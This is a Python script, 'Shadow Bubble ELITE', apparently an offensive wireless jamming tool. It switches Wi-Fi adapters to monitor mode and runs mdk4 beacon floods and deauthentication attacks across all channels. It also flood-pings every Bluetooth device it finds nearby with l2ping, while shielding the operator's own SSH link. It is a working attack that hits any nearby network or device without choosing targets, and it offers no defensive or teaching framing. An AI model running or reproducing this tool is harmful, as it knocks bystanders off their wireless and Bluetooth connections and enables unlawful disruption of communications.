#!/usr/bin/env python3
import subprocess
import signal
import sys
import os
import random
import string
import time
import re
import curses
import psutil
from multiprocessing import Process, Manager as MPManager

manager = MPManager()
process_registry = manager.list()
activity_log = manager.list()
selected_wifis = []
ssh_interface = None

# Terminal Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

def run_command(cmd):
    return subprocess.getoutput(cmd)

def log_activity(message):
    timestamp = time.strftime("[%H:%M:%S]")
    full_message = f"{timestamp} {message}"
    if len(activity_log) > 30:
        activity_log.pop(0)
    activity_log.append(full_message)

def detect_ssh_connection():
    global ssh_interface
    ssh_sessions = run_command("who | grep 'ssh' || true")
    if ssh_sessions:
        ip_matches = re.findall(r"(\d+\.\d+\.\d+\.\d+)", ssh_sessions)
        if ip_matches:
            ssh_ip = ip_matches[0]
            route_info = run_command(f"ip route get {ssh_ip}")
            match = re.search(r"dev (\w+)", route_info)
            if match:
                ssh_interface = match.group(1)
                log_activity(f"[!] SSH active on {ssh_interface}. Protecting it.")

def list_wifi_adapters():
    adapters = []
    output = run_command("iw dev | grep Interface | awk '{print $2}'")
    for adapter in output.strip().split('\n'):
        if adapter:
            adapters.append(adapter)
    return adapters

def list_bt_adapters():
    output = run_command("hciconfig | grep '^hci' | awk '{print $1}'")
    return output.strip().split('\n')

def prepare_monitor_mode(adapter):
    log_activity(f"[*] Enabling monitor mode: {adapter}")
    subprocess.run(f"sudo airmon-ng start {adapter}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    iwconfig_output = run_command(f"iwconfig {adapter}mon")
    if "Mode:Monitor" not in iwconfig_output:
        log_activity(f"[!] Failed to enable Monitor Mode on {adapter}")
        return None
    return adapter + "mon"

def restore_adapter(adapter):
    subprocess.run(f"sudo ip link set {adapter} down", shell=True, stdout=subprocess.DEVNULL)
    subprocess.run(f"sudo iwconfig {adapter} mode managed", shell=True, stdout=subprocess.DEVNULL)
    subprocess.run(f"sudo ip link set {adapter} up", shell=True, stdout=subprocess.DEVNULL)
    subprocess.run(f"sudo hciconfig {adapter} noscan", shell=True, stdout=subprocess.DEVNULL)
    log_activity(f"[+] Restored {adapter} to managed mode.")

def random_ssids(count=750):
    chars = string.ascii_letters + string.digits + "#$%&()*+,-./:;<=>?@[]^_`{|}~"
    return [''.join(random.choices(chars, k=8)) for _ in range(count)]

def beacon_spammer(adapter):
    ssids = random_ssids()
    beacon_proc = subprocess.Popen(f"sudo mdk4 {adapter} b -s 1024 -c 1,6,11", shell=True, stderr=subprocess.DEVNULL)
    process_registry.append(beacon_proc.pid)
    while True:
        time.sleep(10)

def deauth_spammer(adapter):
    deauth_proc = subprocess.Popen(f"sudo mdk4 {adapter} d -c all", shell=True, stderr=subprocess.DEVNULL)
    process_registry.append(deauth_proc.pid)
    while True:
        time.sleep(10)

def bluetooth_jammer(bt_adapter):
    subprocess.run(f"sudo hciconfig {bt_adapter} up piscan", shell=True, stdout=subprocess.DEVNULL)
    while True:
        subprocess.Popen(f"sudo btmgmt find", shell=True, stdout=subprocess.DEVNULL)
        time.sleep(2)
        devices = run_command("hcitool scan | grep ':' | awk '{print $1}'").split()
        for dev in devices:
            subprocess.Popen(f"sudo l2ping -i {bt_adapter} -s 600 -f {dev}", shell=True, stdout=subprocess.DEVNULL)
        log_activity(f"[+] Bluetooth Inquiry Flood Active ({bt_adapter})")
        time.sleep(2)

def channel_hopper(adapter):
    channels = list(range(1, 14))
    last_channel = None
    while True:
        for channel in channels:
            if last_channel != channel:
                subprocess.run(f"sudo iwconfig {adapter} channel {channel}", shell=True, stdout=subprocess.DEVNULL)
                log_activity(f"[+] {adapter} hopping to Channel {channel}")
                last_channel = channel
            time.sleep(2)

def system_monitor():
    while True:
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent
        log_activity(f"[System] CPU: {cpu}% | RAM: {ram}%")
        time.sleep(2)

def kill_all_processes():
    for pid in process_registry:
        try:
            os.kill(pid, 9)
        except ProcessLookupError:
            continue

def cleanup(signum=None, frame=None):
    log_activity("[*] Cleaning up...")
    kill_all_processes()
    for wifi in selected_wifis:
        restore_adapter(wifi.replace("mon", ""))
    print(f"{GREEN}[+] Shadow Bubble ELITE shutdown complete.{RESET}")
    sys.exit(0)

def select_multiple(items, title="Select items"):
    selected = [False] * len(items)
    
    def inner(stdscr):
        curses.start_color()
        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
        idx = 0
        while True:
            stdscr.clear()
            stdscr.addstr(0, 0, title)
            for i, item in enumerate(items):
                mark = "[x]" if selected[i] else "[ ]"
                if selected[i]:
                    stdscr.addstr(i + 1, 0, mark, curses.color_pair(1))
                else:
                    stdscr.addstr(i + 1, 0, mark)
                stdscr.addstr(i + 1, 4, item)
            stdscr.addstr(len(items) + 2, 0, "Use arrows to navigate, space to select, Enter to confirm.")
            stdscr.move(idx + 1, 1)
            key = stdscr.getch()
            if key in [curses.KEY_UP, ord('k')]:
                idx = (idx - 1) % len(items)
            elif key in [curses.KEY_DOWN, ord('j')]:
                idx = (idx + 1) % len(items)
            elif key == ord(' '):
                selected[idx] = not selected[idx]
            elif key in [curses.KEY_ENTER, ord('\n')]:
                break
    curses.wrapper(inner)
    return [items[i] for i, sel in enumerate(selected) if sel]

def live_display():
    stdscr = curses.initscr()
    curses.noecho()
    curses.cbreak()
    while True:
        stdscr.clear()
        maxy, maxx = stdscr.getmaxyx()
        divider = maxx // 2
        stdscr.vline(0, divider, '|', maxy)
        stdscr.addstr(0, 1, "Activity Log")
        stdscr.addstr(0, divider + 2, "System Monitor")
        for idx, entry in enumerate(activity_log[-(maxy - 2):]):
            if idx < maxy - 2:
                stdscr.addstr(idx + 1, 1, entry[:divider-2])
        stdscr.refresh()
        time.sleep(0.5)

# ========= START =========

signal.signal(signal.SIGINT, cleanup)

print(f"{CYAN}[*] Shadow Bubble ELITE Initialization...{RESET}")

detect_ssh_connection()

wifi_adapters = list_wifi_adapters()
bt_adapters = list_bt_adapters()

if ssh_interface:
    wifi_adapters = [w for w in wifi_adapters if w != ssh_interface]

if not wifi_adapters:
    print(f"{RED}[-] No usable Wi-Fi adapters found.{RESET}")
    sys.exit(1)

if not bt_adapters:
    print(f"{RED}[-] No Bluetooth adapters found.{RESET}")
    sys.exit(1)

if len(wifi_adapters) == 1:
    prepared_wifis = [wifi_adapters[0]]
else:
    prepared_wifis = select_multiple(wifi_adapters, "Select Wi-Fi adapters")

if len(bt_adapters) == 1:
    selected_bt = bt_adapters[0]
else:
    selected_bt = select_multiple(bt_adapters, "Select ONE Bluetooth adapter")[0]

for adapter in prepared_wifis:
    mon_adapter = prepare_monitor_mode(adapter)
    if mon_adapter:
        selected_wifis.append(mon_adapter)

# Launch Wi-Fi attacks
for wifi in selected_wifis:
    Process(target=beacon_spammer, args=(wifi,), daemon=True).start()
    Process(target=deauth_spammer, args=(wifi,), daemon=True).start()
    Process(target=channel_hopper, args=(wifi,), daemon=True).start()

# Launch Bluetooth attacks
Process(target=bluetooth_jammer, args=(selected_bt,), daemon=True).start()

# Launch system monitor
Process(target=system_monitor, daemon=True).start()

# --- ONLY NOW start live display after launching jamming
time.sleep(1)
Process(target=live_display, daemon=True).start()

log_activity("[+] Shadow Bubble ELITE fully operational.")
log_activity("[*] Press Ctrl+C to safely shutdown.")

while True:
    time.sleep(1)
